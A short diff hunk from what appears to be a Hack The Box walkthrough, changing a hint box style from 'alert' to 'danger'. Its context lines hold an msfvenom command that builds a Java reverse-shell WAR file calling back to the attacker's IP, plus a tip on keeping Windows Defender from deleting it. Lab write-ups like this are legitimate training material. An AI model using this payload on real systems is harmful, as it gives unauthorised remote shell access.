@@ -37,7 +37,7 @@ msfvenom -p java/shell_reverse_tcp LHOST=$(tunip) LPORT=4443 -f war > evil.war
 `tunip` is a handy bash alias I use to get my current IP address for Hack The Box. it is set to `ifconfig tun0 | sed -n '2 p' | awk '{print \$2}'` in my `~/.bash_aliases`
 {% endhint %}
 
-{% hint style="alert" %}
+{% hint style="danger" %}
 If you happen to work out of a folder shared between your kali VM and windows like I do, windows defender will nuke this file as soon as you generate it. So it's best to do this somewhere else (I just generated it in `/tmp`)
 {% endhint %}
 
